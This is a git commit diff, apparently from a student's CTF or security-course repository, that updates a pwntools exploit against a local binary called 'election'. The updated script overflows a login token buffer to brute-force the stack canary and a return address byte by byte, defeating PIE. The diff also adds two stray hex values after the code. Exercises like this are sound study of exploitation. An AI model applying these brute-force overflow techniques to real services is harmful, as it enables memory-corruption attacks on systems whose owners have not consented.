fd5fce25e7f1f110d345c609f7f1769dfa325564
sytjason <r07922115@ntu.edu.tw>
2019-12-14 02:53:38 +0800

    0x08 update from x1c

--- 0x08/exp.py
+++ 0x08/exp.py
@@ -3,26 +3,44 @@ from pwn import *
 
 context.arch = 'amd64'
 
-r = process('./election', env={"LD_PRELOAD" : "./libc.so"})
+r = process('./election', env={"LD_PRELOAD": "./libc.so"})
 pause()
 
-# leak canary bruteforcely
+# leak canary and some return address bruteforcely
 aaa = 'a' * 0xb8
-canary_leaker = bytearray([0])
+canary_leaker = []
+pie_leaker = []
 
-r.sendlineafter('>', '2') # register
+r.sendlineafter('>', '2')  # register
 r.sendthen('Register an anonymous token: ', aaa)
 
-for j in range(8):
-    for i in range(0xff):
-        r.sendlineafter('>', '1') # login
-        r.sendthen('Token: ', aaa + bytes(canary_leaker)) 
-        canary_leaker[-1] += 1
+j = 0
+while j < 8:
+    for i in range(256):
+        r.sendlineafter('>', '1')  # login
+        r.sendthen('Token: ', aaa + ''.join([chr(x) for x in canary_leaker]) + chr(i))
         if 'Invalid' not in r.recvline():
-            success('buf {} bytes match: {}'.format(j, canary_leaker))
-                r.sendlineafter('>', '3') # logout
-                break
-        canary_leaker.append(0)
+            canary_leaker.append(i)
+            # print("j = {}, leaker = {}".format(j, canary_leaker))
+            r.sendlineafter('>', '3')  # logout
+            j += 1
+            break
+
+j = 0
+while j < 8:
+    for i in range(256):
+        r.sendlineafter('>', '1')  # login
+        r.sendthen('Token: ', aaa + ''.join([chr(x) for x in canary_leaker]) + ''.join([chr(x) for x in pie_leaker]) + chr(i))
+        if 'Invalid' not in r.recvline():
+            pie_leaker.append(i)
+            r.sendlineafter('>', '3')  # logout
+            j += 1
+            break
+
+success("leaked canary: {}".format(hex(u64(''.join([chr(x) for x in canary_leaker])))))
+success("leaked <__libc_csu_init>: {}".format(hex(u64(''.join([chr(x) for x in pie_leaker])))))
 
 r.interactive()
 
+0xdcd78baeddd22d00
+0xdcd78baeddd22d00
